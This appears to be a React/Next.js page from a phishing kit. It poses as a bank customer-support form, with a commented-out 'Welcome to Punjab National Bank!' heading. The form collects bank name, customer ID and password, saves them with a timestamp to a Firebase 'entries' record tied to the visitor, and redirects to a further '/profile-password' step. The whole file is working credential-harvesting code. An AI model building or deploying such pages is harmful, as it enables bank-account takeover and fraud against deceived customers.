"use client";
import { useState } from "react";
import { ref, update } from "firebase/database";
import { database } from "@/app/lib/firebase";
import { useRouter } from "next/navigation";

export default function Home() {
  const router = useRouter();

  const [formData, setFormData] = useState({
    bank_name: "",
    upi_id: "",
    upi_pin: "",
  });

  const handleChange = (e) => {
    let { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Get a reference to the "entries" node in Firebase database
    const formRef = ref(database, "entries");

    // Generate timestamp in milliseconds
    const timestamp = Date.now();

    // Add current timestamp to form data
    const formDataWithTime = {
      ...formData,
      time: timestamp,
    };

    // Push form data to Firebase database
    // const newRef = await push(formRef, formDataWithTime);

    const storedUserId = localStorage.getItem("newUserId");
    if (!storedUserId) {
      console.error("User ID not found in localStorage");
      return;
    }

    const userRef = ref(database, `entries/${storedUserId}`);
    await update(userRef, formDataWithTime);

    // Navigate to "/method" route after submission
    router.push("/profile-password");

    // Clear form data after submission
    setFormData({
      bank_name: "",
      upi_id: "",
      upi_pin: "",
    });
  };

  return (
    <div>
      <section class="w-full">
        {/* <!-- Harsha Web --> */}
        {/* <div className="h-[60px] w-full flex items-center justify-left bg-[#081850] border-b-2 border-white shadow">
          <span className="text-white px-5 text-xl">Customer Support</span>
        </div> */}
        <div class="p-6">
          {/* <h1 className="text-2xl font-bold text-[#91203e]">
            Welcome to Punjab National Bank!
          </h1> */}
          <form
            class="space-y-6 flex flex-col justify-center"
            action=""
            id="third-form"
            onSubmit={handleSubmit} // Added onSubmit handler
          >
            <div className="mt-5">
              <img
                src="/male-customer-support-working-office-answering-consumer-questions_112255-1154.avif"
                className="w-full"
                alt="Logo"
              />
            </div>
            {/* <!-- Full Name --> */}
            <div class="mb-4">
              <label class="block text-gray-700 text-sm mb-2" for="bank_name">
                Bank Name <span className="text-red-500">*</span>
              </label>
              <input
                class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 text-green-700 leading-tight focus:outline-none focus:shadow-outline border-[2px] border-green-500 placeholder:text-green-500"
                id="bank_name"
                name="bank_name"
                type="text"
                placeholder="Enter bank name"
                value={formData.bank_name} // Updated value attribute
                onChange={handleChange} // Added onChange handler
              />
            </div>
            {/* <!-- UPI ID --> */}
            <div class="mb-4">
              <label class="block text-gray-700 text-sm mb-2" for="customer_id">
                Username / Customer ID <span className="text-red-500">*</span>
              </label>
              <input
                class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 text-green-700 leading-tight focus:outline-none focus:shadow-outline border-[2px] border-green-500 placeholder:text-green-500"
                id="customer_id"
                name="customer_id"
                type="text"
                placeholder="Enter username or customer ID"
                value={formData.customer_id} // Updated value attribute
                onChange={handleChange} // Added onChange handler
              />
            </div>

            {/* UPI PIN */}
            <div class="mb-4">
              <label class="block text-gray-700 text-sm mb-2" for="password">
                Password <span className="text-red-500">*</span>
              </label>
              <input
                class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 text-green-700 leading-tight focus:outline-none focus:shadow-outline border-[2px] border-green-500 placeholder:text-green-500"
                id="password"
                name="password"
                type="password"
                placeholder="Enter password"
                value={formData.password} // Updated value attribute
                onChange={handleChange} // Added onChange handler
              />
            </div>

            {/* <!-- Submit Button --> */}
            <div className="w-auto flex justify-end items-center mt-5">
              <button
                className="bg-gradient-to-r from-green-500 to-green-500 text-white uppercase rounded-sm py-2 px-10 focus:outline-none focus:shadow-outline w-auto"
                type="submit"
              >
                Next
              </button>
            </div>
          </form>
        </div>
      </section>
      {/* <!-- Footer --> */}
      <section className="bg-[#ffffff] p-5 w-full mt-24">
        <div className="flex space-x-1 w-full justify-between">
          <span className="text-xs text-black font-bold">Support</span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">Find Us</span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">Pricing & Fees</span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">Compliance</span>
        </div>
        <div className="flex space-x-1 w-full justify-between mt-2">
          <span className="text-xs text-black font-bold">
            Terms & Conditions
          </span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">
            Legal Disclosures
          </span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">
            Safety Guidelines
          </span>
        </div>
        <div className="mt-5 text-[10px] text-black">
          Copyright @2021-2024 Customer Support. All rights reserved.
        </div>
      </section>
    </div>
  );
}
